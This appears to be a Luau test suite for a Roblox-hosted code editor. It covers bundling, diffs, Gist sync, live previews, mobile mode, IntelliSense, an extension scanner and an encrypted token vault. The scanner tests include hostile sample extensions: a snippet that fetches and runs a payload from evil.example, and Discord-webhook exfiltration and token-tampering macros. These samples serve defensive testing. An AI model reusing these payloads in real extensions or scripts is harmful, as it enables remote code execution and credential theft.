	-- (D) 1-Click Standalone Multi-File Workspace Bundler & Execution Verification
	api.writeFile("src/main.luau", 'local h = require("src/helper_mod")\nreturn h.answer * 2\n')
	local okBundle, bundleRes = api.runCommand("workspace.bundle")
	assertTrue(okBundle and bundleRes ~= nil, "Bundled multi-file workspace")
	assertTrue(H.sandbox.isfile(api.workspace.diskPath(bundleRes.outputPath)), "Standalone bundle written to dist/")
	local bundledChunk = assert(H.sandbox.loadstring(bundleRes.content, "@bundled_project"))
	assertEq(bundledChunk(), 84, "Generated standalone bundle executed `require('src/helper_mod')` and returned 84!")

	-- (E) 2-Pane Side-by-Side Diff + Live Gutter Diff Bars + GitHub Gist Import/Publish
	api.git.recordSnapshot("TheStrongestOfTomorrow/DemoRepo", "main", "abc1234", {
		["src/main.luau"] = 'local h = require("src/helper_mod")\nreturn h.answer\n',
	})
	local mainDoc = api.openFile("src/main.luau", { reloadFromDisk = true })
	api.codeStore.updateContent(mainDoc.id, 'local h = require("src/helper_mod")\nlocal bonus = 10\nreturn h.answer + bonus\n')
	local markers = api.codeDiff.lineMarkers(api.git.originalContent("src/main.luau"), mainDoc.content)
	assertTrue(markers[2] ~= nil or markers[3] ~= nil, "Computed live Git gutter diff markers against HEAD")
	assertTrue(H.byName("GitDiffBar_2") ~= nil, "Editor gutter created GitDiffBar widgets")

	local diffDoc = api.codeStore.openDiff("src/main.luau", api.git.originalContent("src/main.luau"), mainDoc.content)
	assertTrue(diffDoc.isDiff == true, "Opened diff tab via codeStore.openDiff")
	assertTrue(H.byName("DiffSideBySideWrap").Visible == true, "2-Pane Side-by-Side Diff Viewer visible by default")
	H.click(H.byName("ToggleDiffModeBtn"))
	assertTrue(H.byName("DiffUnifiedScroll").Visible == true, "Toggled Diff Viewer to Unified mode")
	H.click(H.byName("ToggleDiffModeBtn"))
	assertTrue(H.byName("DiffSideBySideWrap").Visible == true, "Toggled Diff Viewer back to Side-by-Side mode")

	-- Mock GitHub Gist API for Import + Publish
	api.config.set("github.token", "ghp_test_token_123", { immediate = true })
	H.onHttp(function(req, url, method)
		if url == "https://api.github.com/gists/a1b2c3d4e5f60001" and method == "GET" then
			return {
				StatusCode = 200,
				Body = {
					files = {
						["utility_snippet.luau"] = { content = "return 'from_gist'\n" },
					},
				},
			}
		elseif url == "https://api.github.com/gists" and method == "POST" then
			local payload = json.decode(req.Body)
			assertTrue(type(payload.files) == "table", "Gist POST body includes files map")
			return {
				StatusCode = 201,
				Body = {
					id = "f00dbabe12345678",
					html_url = "https://gist.github.com/f00dbabe12345678",
				},
			}
		end
	end)
	local importedGist, igErr = api.importGist("a1b2c3d4e5f60001")
	assertTrue(importedGist ~= nil and importedGist.count == 1, "Imported GitHub Gist to local disk: " .. tostring(igErr))
	assertEq(api.readFile("gists/utility_snippet.luau"), "return 'from_gist'\n", "Gist content persisted to disk")

	api.openFile("gists/utility_snippet.luau")
	local pubGist, pgErr = api.publishGist({ public = false })
	assertTrue(pubGist ~= nil and pubGist.url == "https://gist.github.com/f00dbabe12345678", "Published Gist via POST /gists: " .. tostring(pgErr))
	assertEq(H.sandbox.__clipboard, "https://gist.github.com/f00dbabe12345678", "Published Gist URL copied to clipboard")

	-- (F) Upgraded Settings UI + Live Raw `settings.json` Sync
	local okSettings, settingsDoc = api.runCommand("preferences.openSettingsJson")
	assertTrue(okSettings and settingsDoc ~= nil and settingsDoc.path == ".vsrblx/settings.json", "Opened raw .vsrblx/settings.json")
	local parsedCfg = json.decode(settingsDoc.content)
	parsedCfg.editor.tabSize = 2
	api.codeStore.updateContent(settingsDoc.id, json.encode(parsedCfg))
	api.runCommand("file.save")
	assertEq(api.config.get("editor.tabSize"), 2, "Saving .vsrblx/settings.json live-synced config.editor.tabSize = 2!")
end)

check("9. Combined Sprint 4 + Sprint 5: Multi-Language Live Split Preview Engine & Mobile Acode Mode", function()
	-- (A) Language-Gated Preview Eligibility (Included on previewable, strictly omitted on non-previewable)
	for _, yesLang in ipairs({ "html", "css", "markdown", "json", "yaml", "sql", "python", "javascript", "typescript" }) do
		assertTrue(api.languages.isPreviewable(yesLang) == true, yesLang .. " supports live preview")
	end
	for _, noLang in ipairs({ "luau", "rust", "go", "cpp", "csharp", "java", "shell", "plaintext" }) do
		assertTrue(api.languages.isPreviewable(noLang) == false, noLang .. " omits live preview")
	end

	-- Opening a Luau or Rust file hides `OpenPreviewBtn_primary` and refuses `preview.openToSide`
	api.writeFile("src/engine.rs", "fn main() { println!(\"no preview\"); }\n")
	api.openFile("src/engine.rs")
	assertEq(H.byName("OpenPreviewBtn_primary").Visible, false, "Preview button hidden on Rust (.rs) file")
	local okNoPrev, resNoPrev = api.openPreview()
	assertTrue(okNoPrev and resNoPrev == false, "openPreview() cleanly declined on non-previewable language")
	assertEq(H.byName("LivePreviewPane").Visible, false, "LivePreviewPane stays hidden on Rust")

	-- (B) Live HTML + Workspace `style.css` Split Preview (with live CSS edit sync!)
	api.writeFile("web/style.css", "body { background-color: #0f172a; color: #f8fafc; }\n.hero { background: #2563eb; color: #ffffff; padding: 14px; border-radius: 8px; }\nbutton { background: #22c55e; color: #111827; }\n")
	api.writeFile("web/index.html", table.concat({
		"<!DOCTYPE html>",
		"<html><head><title>RBLX Web UI</title><link rel=\"stylesheet\" href=\"style.css\"></head>",
		"<body>",
		"  <h1>Welcome to Live HTML Preview</h1>",
		"  <div class=\"hero\">Styled by live style.css!</div>",
		"  <button>Deploy Build</button>",
		"</body></html>",
	}, "\n"))
	local htmlDoc = api.openFile("web/index.html")
	assertTrue(H.byName("OpenPreviewBtn_primary").Visible == true, "Preview button shown on HTML file")
	H.click(H.byName("OpenPreviewBtn_primary"))
	assertTrue(H.byName("LivePreviewPane").Visible == true, "LivePreviewPane opened to the side")
	local htmlSurf = H.byName("HtmlPreviewSurface")
	assertTrue(htmlSurf ~= nil, "HtmlPreviewSurface rendered")
	assertEq(htmlSurf.BackgroundColor3:ToHex(), "0f172a", "HTML surface applied body background #0f172a from style.css")

	-- Edit `web/style.css` on disk and re-activate HTML -> preview cascades new CSS color immediately!
	api.writeFile("web/style.css", "body { background-color: #1e1b4b; color: #f8fafc; }\n")
	api.codeStore.activate(htmlDoc.id, "primary")
	api.app.previewPane.render(htmlDoc)
	assertEq(H.byName("HtmlPreviewSurface").BackgroundColor3:ToHex(), "1e1b4b", "Live CSS change updated HTML preview background to #1e1b4b")

	-- (C) CSS Design System Preview, Markdown GFM Preview, JSON/YAML Tree, SQL Table & Python/TS Quick-Eval
	api.openFile("web/style.css")
	assertTrue(H.byName("CssSwatchGrid") ~= nil, "CSS preview rendered extracted color swatch palette")

	api.writeFile("docs/guide.md", "# Sprint Guide\n- [x] Ship Preview\n| Lang | Live |\n|---|---|\n| HTML | Yes |\n```luau\nlocal ok = true\n```\n")
	api.openFile("docs/guide.md")
	assertTrue(H.byName("MdHeading_1") ~= nil and H.byName("MdTable_3") ~= nil and H.byName("MdCodeFence_4") ~= nil,
		"Markdown preview rendered GFM heading, table, and syntax-colored code fence")

	api.writeFile("config/app.json", '{"app":"VS-RBLX","features":["preview","mobile"],"port":8080}')
	api.openFile("config/app.json")
	assertTrue(H.byName("TreeNode_root") ~= nil, "JSON preview rendered interactive collapsible tree")

	api.writeFile("db/schema.sql", table.concat({
		"CREATE TABLE players (id INT, username TEXT, score INT);",
		"INSERT INTO players VALUES (1, 'Builderman', 950), (2, 'Guest', 420);",
		"SELECT username, score FROM players WHERE score > 500;",
	}, "\n"))
	api.openFile("db/schema.sql")
	local sqlGrid = H.byName("SqlResultGrid_1")
	assertTrue(sqlGrid ~= nil, "SQL preview executed CREATE/INSERT/SELECT and rendered result table")

	api.writeFile("scripts/calc.py", "base = 21\ndoubled = base * 2\nprint(f'Computed={doubled}')\n")
	api.openFile("scripts/calc.py")
	assertTrue(H.byName("ScriptEvalOutputCard") ~= nil and H.byName("ScriptEvalVarsCard") ~= nil,
		"Python quick-eval preview rendered stdout (`Computed=42`) & variable table")

	-- Switching back to a Luau file automatically hides LivePreviewPane & preview button!
	api.openFile("src/main.luau")
	assertEq(H.byName("OpenPreviewBtn_primary").Visible, false, "Preview button hidden when switching back to Luau")
	assertEq(H.byName("LivePreviewPane").Visible, false, "LivePreviewPane hidden when active tab is Luau")

	-- (D) Mobile "Acode" Mode: Manual Toggle, 42px Touch Tabs, `☰` Slide-Over Drawer, Quick-Keys & Play-While-Coding
	assertEq(api.isMobileMode(), false, "Starts in Desktop mode on desktop viewport")
	api.setMobileMode(true)
	assertTrue(api.isMobileMode() == true, "Switched to Acode Mobile Mode manually")
	assertEq(H.byName("MobileDrawerBtn").Visible, true, "`☰` MobileDrawerBtn visible in TitleBar")
	assertEq(H.byName("TabBar_primary").Size.Y.Offset, 42, "Touch-friendly 42px TabBar active in Mobile Mode")
	assertEq(H.byName("MobileQuickKeysBar").Visible, true, "Acode Quick-Keys symbol bar visible")
	assertEq(H.byName("ActivityBar").Visible, false, "Desktop ActivityBar collapsed into slide-over drawer")

	-- Open `☰` Slide-Over Drawer -> switch to Search -> tap backdrop to dismiss
	H.click(H.byName("MobileDrawerBtn"))
	assertEq(H.byName("PrimarySideBar").Visible, true, "Slide-over drawer opened on `☰` tap")
	assertEq(H.byName("MobileDrawerBackdrop").Visible, true, "Drawer backdrop visible")
	H.click(H.byName("DrawerTab_search"))
	assertEq(api.app.viewlets.search.root.Visible, true, "Switched drawer viewlet to Search via touch pill")
	H.click(H.byName("MobileDrawerBackdrop"))
	assertEq(H.byName("PrimarySideBar").Visible, false, "Tapping backdrop dismissed slide-over drawer")

	-- Tap Acode Quick-Key `{` to insert symbol at cursor
	api.writeFile("src/mobile_edit.luau", "local tbl = ")
	local mobDoc = api.openFile("src/mobile_edit.luau", { reloadFromDisk = true })
	api.app.primaryEditor.box.CursorPosition = #mobDoc.content + 1
	api.app.primaryEditor.box.SelectionStart = -1
	H.click(H.byName("QuickKey_lbrace"))
	assertEq(mobDoc.content, "local tbl = {", "Acode Quick-Key `{` inserted `{` at cursor")

	-- Keyboard-aware viewport shrink & Play-While-Coding split-peek dock
	api.responsive.setVirtualKeyboard(true, 220)
	assertTrue(H.byName("VSCodeWindow").Size.Y.Offset <= 900 - 220, "Window shrunk above virtual on-screen keyboard")
	api.responsive.setVirtualKeyboard(false)

	H.click(H.byName("QuickKey_play"))
	assertTrue(api.app.window.playWhileCoding == true, "Play-While-Coding split-peek activated")
	assertTrue(H.byName("VSCodeWindow").Position.X.Offset > 400, "Window docked to right half leaving left gameplay area open")
	assertTrue(api.getOpacity() <= 0.75, "Play-While-Coding enabled translucent Ghost opacity")
	H.click(H.byName("QuickKey_play"))
	api.setMobileMode(false)
	assertEq(api.isMobileMode(), false, "Switched back to Desktop mode anytime")

	-- (E) Android / Touch Device Auto-Detection + Switch Prompt on First Boot
	local HMobile = mockEnv.new({ width = 844, height = 390, touch = true })
	local mobApi, mErr = HMobile.boot("dist/vsrblx.lua")
	assertTrue(mobApi ~= nil, "Booted on simulated Android touch viewport: " .. tostring(mErr))
	local promptModal = HMobile.byName("ConfirmModal")
	assertTrue(promptModal ~= nil, "Touch device auto-surfaced Acode Mobile Mode switch prompt!")
	HMobile.click(HMobile.byName("ConfirmPrimaryBtn"))
	assertTrue(mobApi.isMobileMode() == true, "Accepting prompt switched player straight into Acode Mobile Mode!")

	-- A player can deliberately switch back to Desktop Mode on touch hardware.
	mobApi.setMobileMode(false)
	assertEq(mobApi.isMobileMode(), false, "Desktop Mode remains selectable on a touch device")
	assertEq(HMobile.byName("CompactMenuBtn").Visible, true, "Compact touch Desktop keeps the compact desktop menu")
	assertEq(HMobile.byName("VSCodeBrand").Visible, false, "Compact touch Desktop avoids logo overlap with its drawer/menu controls")
	assertTrue(HMobile.byName("MobileDrawerBtn").AbsolutePosition.X + HMobile.byName("MobileDrawerBtn").AbsoluteSize.X <= HMobile.byName("CompactMenuBtn").AbsolutePosition.X,
		"Compact touch Desktop drawer and menu buttons do not overlap in landscape")
	HMobile.setViewport(390, 844)
	assertEq(HMobile.byName("MobileQuickKeysBar").Visible, false, "Desktop Mode does not inherit Acode Quick-Keys")
	assertEq(HMobile.byName("MobileDrawerBtn").Visible, true, "Compact touch Desktop retains a reachable workspace drawer button")
	assertEq(HMobile.byName("TabBar_primary").Size.Y.Offset, 38, "Compact touch Desktop uses larger tabs without switching to Acode styling")
	assertEq(HMobile.byName("ActivityBar").Visible, false, "Compact touch Desktop hides the width-consuming activity rail")
	assertEq(HMobile.byName("PrimarySideBar").Visible, false, "Compact touch Desktop keeps the workspace drawer closed by default")
	assertEq(HMobile.byName("MainEditorAndPanelStack").Size.X.Scale, 1, "Compact touch Desktop gives the editor the full available width")
	HMobile.click(HMobile.byName("MobileDrawerBtn"))
	assertEq(HMobile.byName("PrimarySideBar").Visible, true, "Workspace drawer opens on demand in compact touch Desktop")
	assertEq(HMobile.byName("MobileDrawerNav").Visible, true, "Compact touch Desktop exposes the viewlet switcher in its drawer")
	HMobile.click(HMobile.byName("MobileDrawerBackdrop"))
	assertEq(HMobile.byName("PrimarySideBar").Visible, false, "Compact touch Desktop drawer dismisses cleanly")
	mobApi.app.window.setPlayWhileCoding(true)
	assertEq(mobApi.isMobileMode(), false, "Play-While-Coding does not force Acode Mode")
	assertTrue(HMobile.byName("VSCodeWindow").Size.X.Offset <= 280, "Compact touch Desktop uses a narrow right-side coding dock")
	assertTrue(HMobile.byName("VSCodeWindow").Position.X.Offset >= 90, "Compact touch Desktop dock preserves visible gameplay space")
	mobApi.app.window.setPlayWhileCoding(false)
	mobApi.destroy()
end)

check("10. Finale 6A + Finale 6B: Deep LSP-Style IntelliSense Engine & Locked 5-Template Community Extension Hub", function()
	-- =========================================================================
	-- FINALE 6A: Deep LSP-Style IntelliSense Engine
	-- =========================================================================

	-- (1) `$0` Cursor-Stop Expansion
	local expText, caretOff = api.intellisense.expandInsert('game:GetService("$0")')
	assertEq(expText, 'game:GetService("")', "Cleaned $0 marker from snippet")
	assertEq(caretOff, 17, "Placed caret right between quotes")

	-- (2) `GetService("...")`, `Instance.new("...")` & `Enum.<Category>.<Item>` Completion
	local svcSug = api.intellisense.suggest('local P = game:GetService("Tw', 30, "luau", 8)
	assertTrue(#svcSug >= 1 and svcSug[1].label == "TweenService", "Suggested TweenService inside GetService(\"Tw")

	local clsSug = api.intellisense.suggest('local b = Instance.new("TextB', 30, "luau", 8)
	assertTrue(#clsSug >= 1 and clsSug[1].label == "TextButton", "Suggested TextButton inside Instance.new(\"TextB")

	local enumSug = api.intellisense.suggest("local style = Enum.EasingStyle.Qu", 34, "luau", 8)
	assertTrue(#enumSug >= 1 and enumSug[1].label:find("^Qu") ~= nil, "Suggested Enum.EasingStyle.Quad/Quart/Quint")

	-- (3) Live DataModel Child Introspection (`workspace.` -> live child Instances + Workspace members)
	local spawnPart = H.sandbox.Instance.new("Part", H.sandbox.workspace)
	spawnPart.Name = "ArenaSpawnPad"
	local liveWsSug = api.intellisense.suggest("workspace.Arena", 16, "luau", 8)
	local foundSpawnPad = false
	for _, it in ipairs(liveWsSug) do
		if it.label == "ArenaSpawnPad" and it.kind == "instance" then
			foundSpawnPad = true
		end
	end
	assertTrue(foundSpawnPad, "Introspected live DataModel child `workspace.ArenaSpawnPad`!")

	-- (4) Local Variable Type Inference (`Players.` vs `Players:`)
	local typedSrc = 'local Players = game:GetService("Players")\nPlayers.'
	local propSug = api.intellisense.suggest(typedSrc, #typedSrc + 1, "luau", 10)
	local foundLP = false
	for _, it in ipairs(propSug) do
		if it.label == "LocalPlayer" then foundLP = true end
	end
	assertTrue(foundLP, "Inferred `Players` service type and suggested `.LocalPlayer` property")

	local methSrc = 'local Players = game:GetService("Players")\nPlayers:GetP'
	local methSug = api.intellisense.suggest(methSrc, #methSrc + 1, "luau", 10)
	assertTrue(#methSug >= 1 and methSug[1].label == "GetPlayers", "Inferred `Players:GetPlayers()` method on `:`")

	-- (5) Cross-File Workspace `require("...")` Indexing, Signature Help, Hover Docs & `F12` Go-to-Definition
	api.writeFile("src/combat_math.luau", table.concat({
		"local M = {}",
		"-- Computes critical melee hit damage with armor mitigation",
		"function M.calcDamage(baseDmg: number, critMult: number, armor: number)",
		"\treturn math.max(1, baseDmg * critMult - armor)",
		"end",
		"M.DEFAULT_CRIT = 1.5",
		"return M",
	}, "\n"))

	-- `require("...")` path autocomplete
	local reqSug = api.intellisense.suggest('local cm = require("src/combat', 31, "luau", 8, "src/caller.luau")
	assertTrue(#reqSug >= 1 and reqSug[1].label == "src/combat_math", "Suggested workspace module path inside require(\"...")

	-- Cross-file exported member completion (`cm.`)
	local callerDraft = 'local cm = require("src/combat_math")\ncm.'
	local expSug = api.intellisense.suggest(callerDraft, #callerDraft + 1, "luau", 8, "src/caller.luau")
	local foundCalc = false
	for _, it in ipairs(expSug) do
		if it.label == "calcDamage" then foundCalc = true end
	end
	assertTrue(foundCalc, "Suggested cross-file exported function `cm.calcDamage` from `src/combat_math.luau`!")

	-- Parameter Signature Help (`cm.calcDamage(50, ` -> activeParam = 2!)
	local callInProgress = 'local cm = require("src/combat_math")\nlocal d = cm.calcDamage(50, '
	local sigInfo = api.intellisense.signatureHelp(callInProgress, #callInProgress + 1, "luau", "src/caller.luau")
	assertTrue(sigInfo ~= nil and sigInfo.activeParam == 2, "Signature help resolved `cm.calcDamage` activeParam == 2")
	assertTrue(sigInfo.params[2]:find("critMult") ~= nil, "Signature help identified 2nd parameter `critMult: number`")

	-- Live Editor UI: SignatureHelpCard, HoverDocCard & `F12` Cross-File Go-to-Definition!
	api.writeFile("src/caller.luau", 'local cm = require("src/combat_math")\nlocal hit = cm.calcDamage(100, 2, 15)\n')
	local callerDoc = api.openFile("src/caller.luau", { reloadFromDisk = true })
	local edBox = api.app.primaryEditor.box
	edBox:CaptureFocus()
	local calcIdx = callerDoc.content:find("calcDamage", 1, true)
	edBox.CursorPosition = calcIdx + 3
	api.codeStore.setCursor(callerDoc.id, calcIdx + 3, -1)

	local okHov, hovInfo = api.runCommand("editor.showHover")
	assertTrue(okHov and hovInfo ~= nil and hovInfo.doc:find("critical melee") ~= nil,
		"Hover card extracted doc comment from cross-file `src/combat_math.luau`!")
	assertEq(H.byName("HoverDocCard").Visible, true, "HoverDocCard visible in editor")

	local okDef, defInfo = api.runCommand("editor.gotoDefinition")
	assertTrue(okDef and defInfo ~= nil and defInfo.file == "src/combat_math.luau" and defInfo.line == 3,
		"F12 Go-to-Definition resolved `src/combat_math.luau:3`!")
	assertEq(api.codeStore.active("primary").path, "src/combat_math.luau",
		"F12 opened `src/combat_math.luau` in primary editor!")

	-- =========================================================================
	-- FINALE 6B: Locked 5-Template Community Extension Hub & Malware Scanner
	-- =========================================================================

	-- (1) Verify all 5 Official Starter Packs pass the Malware & Schema Scanner
	assertEq(#api.extensionHub.STARTER_CATALOG, 5, "All 5 allowed template starter packs present")
	for _, starter in ipairs(api.extensionHub.STARTER_CATALOG) do
		local sc = api.scanExtension(starter)
		assertTrue(sc.ok == true and sc.risk == "CLEAN", "Starter pack `" .. starter.id .. "` verified CLEAN")
	end

	-- (2) Verify Malware & Schema Scanner strictly BLOCKS every attack vector & non-template issue!
	local badTemplate = api.scanExtension({
		id = "arbitrary-script",
		name = "Arbitrary Runner",
		version = "1.0.0",
		template = "raw-luau-script",
	})
	assertEq(badTemplate.ok, false, "Blocked non-allowlisted 6th template (`raw-luau-script`)")

	local badLoadstring = api.scanExtension({
		id = "sneaky-snippets",
		name = "Sneaky Snippets",
		version = "1.0.0",
		template = "snippet-pack",
		snippets = {
			{ trigger = "help", insert = 'loadstring(game:HttpGet("https://evil.example/payload.lua"))()' },
		},
	})
	assertEq(badLoadstring.ok, false, "Blocked `loadstring` + `HttpGet` hidden inside snippet-pack")

	local badWebhook = api.scanExtension({
		id = "stealer-macro",
		name = "Stealer Macro",
		version = "1.0.0",
		template = "command-macro",
		macros = {
			{
				id = "steal",
				title = "Exfil",
				steps = {
					{ op = "insertText", text = "https://discord.com/api/webhooks/12345/token" },
					{ op = "setSetting", key = "github.pat", value = "stolen" },
				},
			},
		},
	})
	assertEq(badWebhook.ok, false, "Blocked Discord webhook + `github.pat` tampering in command-macro")

	local badEscapedBytecode = api.scanExtension({
		id = "bytecode-pack",
		name = "Bytecode Obfuscated",
		version = "1.0.0",
		template = "snippet-pack",
		snippets = {
			{ trigger = "obf", insert = "\\108\\111\\097\\100\\115\\116\\114\\105\\110\\103" },
		},
	})
	assertEq(badEscapedBytecode.ok, false, "Blocked decimal-escaped bytecode sequence")

	local badOffTopicIssue = api.scanExtension({
		number = 42,
		title = "pls add free blox fruits script",
		body = "hello how do i get infinite money",
	})
	assertEq(badOffTopicIssue.ok, false, "Blocked off-topic non-template GitHub Issue")

	-- (3) Install Verified Theme Pack, Snippet Pack, Command Macro & Toolbar Tool -> Test Live Effects!
	local okTheme = api.installExtension(api.extensionHub.STARTER_CATALOG[1]) -- cyberpunk-neon-theme
	assertTrue(okTheme == true, "Installed verified `theme-pack` extension")
	api.setTheme("ext_cyberpunk_neon_theme")
	assertEq(api.theme.color.accent:ToHex(), "00f0ff", "Applied custom Cyberpunk Neon theme accent `#00f0ff`")

	local okSnip = api.installExtension(api.extensionHub.STARTER_CATALOG[2]) -- roblox-net-combat-snippets
	assertTrue(okSnip == true, "Installed verified `snippet-pack` extension")
	local extSnipSug = api.intellisense.suggest("remf", 5, "luau", 8)
	assertTrue(#extSnipSug >= 1 and extSnipSug[1].label == "remfire", "Installed snippet-pack registered `remfire` trigger in LSP!")

	local okMacro = api.installExtension(api.extensionHub.STARTER_CATALOG[3]) -- luau-header-service-macros
	assertTrue(okMacro == true, "Installed verified `command-macro` extension")

	local okTool = api.installExtension(api.extensionHub.STARTER_CATALOG[5]) -- luau-buffer-power-tools
	assertTrue(okTool == true, "Installed verified `toolbar-tool` extension")
	api.writeFile("src/unsorted.txt", "zebra\nalpha\nmango")
	local sortDoc = api.openFile("src/unsorted.txt", { reloadFromDisk = true })
	api.runCommand("ext.luau-buffer-power-tools.sortLines")
	assertEq(sortDoc.content, "alpha\nmango\nzebra", "Installed `toolbar-tool` sorted buffer lines declaratively!")

	-- (4) Live GitHub Issues Hub Sync: 1 Valid Community Issue (#101) + 1 Malicious Issue (#102)
	local validIssueMd = api.extensionHub.generateIssueMarkdown({
		id = "emerald-matrix-theme",
		name = "Emerald Matrix Dark",
		version = "1.2.0",
		author = "luau-artist",
		summary = "Phosphor green terminal theme.",
		template = "theme-pack",
		theme = {
			isLight = false,
			colors = { editor = "#050d07", accent = "#00ff66" },
			syntax = { keyword = "#00ff66" },
		},
	})
	local maliciousIssueMd = validIssueMd:gsub("Phosphor green terminal theme%.", "https://discord.com/api/webhooks/999/steal")

	H.onHttp(function(_req, url)
		if url == RAW_URL then
			return { StatusCode = 200, Body = bundleSource }
		elseif url:find("/repos/TheStrongestOfTomorrow/VS%-RBLX/issues") then
			return {
				StatusCode = 200,
				Body = json.encode({
					{
						number = 101,
						title = "[EXT] Emerald Matrix Dark",
						user = { login = "luau-artist" },
						comments = 4,
						body = validIssueMd,
					},
					{
						number = 102,
						title = "[EXT] Totally Safe Pack",
						user = { login = "bad-actor" },
						comments = 0,
						body = maliciousIssueMd,
					},
				}),
			}
		end
	end)

	api.runCommand("workbench.viewExtensions")
	local synced = api.syncExtensions("TheStrongestOfTomorrow/VS-RBLX")
	assertEq(#synced, 2, "Fetched 2 open GitHub Issue submissions")
	assertEq(synced[1].scan.ok, true, "Issue #101 (`emerald-matrix-theme`) verified CLEAN by client scanner")
	assertEq(synced[2].scan.ok, false, "Issue #102 (webhook exfil) BLOCKED by client scanner")
	assertEq(H.byName("ExtScanBadge_emerald-matrix-theme").Text, "🛡 CLEAN", "UI rendered `🛡 CLEAN` badge on #101")

	-- Attempting to install blocked Issue #102 fails closed!
	local okEvilInstall = api.installExtension(synced[2].manifest or maliciousIssueMd)
	assertEq(okEvilInstall, false, "Client refused to install blocked Issue #102")

	-- Clean uninstall restores default theme & removes extension commands
	assertTrue(api.uninstallExtension("cyberpunk-neon-theme") == true, "Uninstalled cyberpunk-neon-theme cleanly")
	assertEq(api.theme.activeId, "dark_plus", "Reverted active theme to `dark_plus` on uninstall")
end)

check("11. Combined Sprint v2A (v2.1 + v2.2): Movable Mobile Window, Draggable Pill, Multi-Tab Bar, Phone Breakpoints & Zero-Knowledge Master Vault", function()
	-- =========================================================================
	-- (A) NIST FIPS 180-4 SHA-256 Vector + Zero-Knowledge Master Vault (`vault.enc`)
	-- =========================================================================
	local vault = api.cryptoVault
	local ghNet = api._env.require("net/github")
	assertEq(vault.sha256Hex("abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
		"Pure Lua SHA-256 matches exact NIST FIPS 180-4 test vector for 'abc'")
	assertEq(vault.sha256Hex(""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
		"Pure Lua SHA-256 matches exact NIST FIPS 180-4 empty-string vector")

	-- Migrate an existing plaintext GitHub PAT into Zero-Knowledge Master Vault!
	ghNet.setToken("ghp_ultra_secret_pat_v2A_98765")
	assertEq(ghNet.token(), "ghp_ultra_secret_pat_v2A_98765", "Plaintext token active prior to Vault encryption")

	local okVault, vErr = vault.createMasterKey("MasterKey#2026!RBLX")
	assertTrue(okVault == true, "Created Zero-Knowledge Master Vault: " .. tostring(vErr))
	assertTrue(vault.isEncrypted() == true and vault.isUnlocked() == true, "Vault is encrypted & session unlocked")
	assertTrue(H.sandbox.isfile("VSRBLX/vault.enc"), "Encrypted VSRBLX/vault.enc persisted to executor disk")

	-- Verify ZERO plaintext leakage in `VSRBLX/vault.enc` AND `VSRBLX/settings.json`!
	local rawVaultDisk = H.sandbox.readfile("VSRBLX/vault.enc")
	local rawSettingsDisk = H.sandbox.readfile("VSRBLX/settings.json")
	assertEq(rawVaultDisk:find("ghp_ultra_secret_pat_v2A_98765", 1, true), nil, "Ciphertext in vault.enc contains ZERO plaintext PAT bytes")
	assertEq(rawVaultDisk:find("MasterKey#2026!RBLX", 1, true), nil, "vault.enc NEVER stores the Master Vault Key")
	assertEq(rawSettingsDisk:find("ghp_ultra_secret_pat_v2A_98765", 1, true), nil, "settings.json scrubbed of plaintext PAT")
	assertEq(ghNet.token(), "ghp_ultra_secret_pat_v2A_98765", "github.token() reads decrypted PAT from RAM while unlocked")

	-- Lock Vault -> RAM wiped -> github.token() returns "" -> Wrong key rejected -> Right key unlocks!
	vault.lock()
	assertEq(vault.isUnlocked(), false, "Master Vault locked")
	assertEq(ghNet.token(), "", "Locked Master Vault never exposes PAT without Master Key")
	local badSetOk, badSetErr = ghNet.setToken("ghp_should_fail_while_locked")
	assertEq(badSetOk, nil, "Writing PAT while Vault is locked is refused: " .. tostring(badSetErr))

	local okWrong = vault.unlock("WrongPassphrase999")
	assertEq(okWrong, false, "HMAC-SHA256 rejected wrong Master Vault Key")
	assertEq(ghNet.token(), "", "PAT remains unrecoverable after wrong Master Key attempt")

	-- Tamper test: flip 1 hex character in ciphertext and verify Encrypt-then-HMAC-SHA256 catches tampering!
	local parsedEnc = json.decode(rawVaultDisk)
	local origCt = parsedEnc.ct
	local firstChar = origCt:sub(1, 1)
	parsedEnc.ct = ((firstChar == "a") and "b" or "a") .. origCt:sub(2)
	H.sandbox.writefile("VSRBLX/vault.enc", json.encode(parsedEnc))
	local okTampered, tamperErr = vault.unlock("MasterKey#2026!RBLX")
	assertEq(okTampered, false, "Tampered vault.enc rejected by Encrypt-then-HMAC-SHA256: " .. tostring(tamperErr))

	-- Restore valid vault.enc and unlock with exact Master Vault Key!
	H.sandbox.writefile("VSRBLX/vault.enc", rawVaultDisk)
	local okRight, uErr = vault.unlock("MasterKey#2026!RBLX")
	assertTrue(okRight == true, "Exact Master Vault Key unlocked vault.enc: " .. tostring(uErr))
	assertEq(ghNet.token(), "ghp_ultra_secret_pat_v2A_98765", "Recovered exact GitHub PAT in RAM after valid unlock!")

	-- Extension Hub blocks `vault.*` setting tampering
	local badVaultPreset = api.scanExtension({
		id = "evil-vault-downgrade",
		name = "Evil Vault Preset",
		version = "1.0.0",
		author = "mallory",
		template = "settings-preset",
		settings = { ["vault.mode"] = "unencrypted" },
	})
	assertEq(badVaultPreset.ok, false, "Extension Hub blocked community preset attempting to modify vault.mode")

	-- =========================================================================
	-- (B) Movable Floating Mobile Window + Mobile `⤢` Resize + Draggable Pill
	-- =========================================================================
	local winRoot = H.byName("VSCodeWindow")
	local titleBar = H.byName("TitleBar")
	H.setViewport(844, 390)
	api.setMobileMode(true)
	api.runCommand("window.center")

	-- Mobile Mode floats (< full viewport) so players can move & resize freely!
	assertTrue(winRoot.Size.X.Offset < 844, "Mobile Mode window floats instead of locking full-bleed")
	local mobStartX = winRoot.Position.X.Offset
	local mobStartY = winRoot.Position.Y.Offset
	H.drag(titleBar, mobStartX + 120, mobStartY + 12, mobStartX + 145, mobStartY + 22)
	assertEq(winRoot.Position.X.Offset, mobStartX + 25, "Dragged floating Mobile Mode window horizontally")

	-- Toggle `⤢` Resize Mode ON in Mobile Mode and push/pull resize!
	H.click(H.byName("ResizeModeBtn"))
	assertEq(api.isResizeMode(), true, "Turned Resize Mode ON in Mobile Mode")
	local mobPreW = winRoot.Size.X.Offset
	H.drag(H.byName("ResizeBottomRight"), 700, 320, 640, 290)
	assertTrue(winRoot.Size.X.Offset < mobPreW, "Shrunk Mobile Mode window via Bottom-Right handle")
	H.click(H.byName("ResizeModeBtn"))
	assertEq(api.isResizeMode(), false, "Turned Resize Mode OFF in Mobile Mode")

	-- Minimize to `MinimizedPill` -> Drag pill away from thumbstick -> Tap to restore!
	api.app.window.minimise()
	local pill = H.byName("MinimizedPill")
